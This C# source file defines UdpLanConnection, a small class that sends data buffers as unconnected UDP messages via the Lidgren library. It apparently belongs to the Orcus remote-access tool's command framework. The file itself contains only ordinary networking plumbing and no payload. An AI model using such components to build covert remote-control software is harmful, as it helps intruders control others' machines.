using System;
using System.Net;
using Lidgren.Network;
using Orcus.Plugins;
using Orcus.Shared.Data;
using Orcus.Shared.Server;

namespace Orcus.Commands.ConnectionInitializer
{
    public class UdpLanConnection : IConnection
    {
        private readonly NetClient _netClient;
        private readonly IPEndPoint _ipEndPoint;

        public UdpLanConnection(NetClient netClient, IPEndPoint ipEndPoint)
        {
            _netClient = netClient;
            _ipEndPoint = ipEndPoint;
        }

        public void Dispose()
        {
        }

        public void SendData(byte[] buffer, int offset, int length)
        {
            byte[] data;
            if (offset == 0 && length == buffer.Length)
            {
                data = buffer;
            }
            else
            {
                data = new byte[length];
                Buffer.BlockCopy(buffer, offset, data, 0, length);
            }

            var message = _netClient.CreateMessage(length);
            message.Write(data);
            //_netClient.SendMessage(message, _netConnection, NetDeliveryMethod.ReliableSequenced);
            _netClient.SendUnconnectedMessage(message, _ipEndPoint);
        }

        public void SendStream(WriterCall writerCall)
        {
            throw new NotSupportedException();
        }

        public bool SupportsStream { get; } = false;
    }
}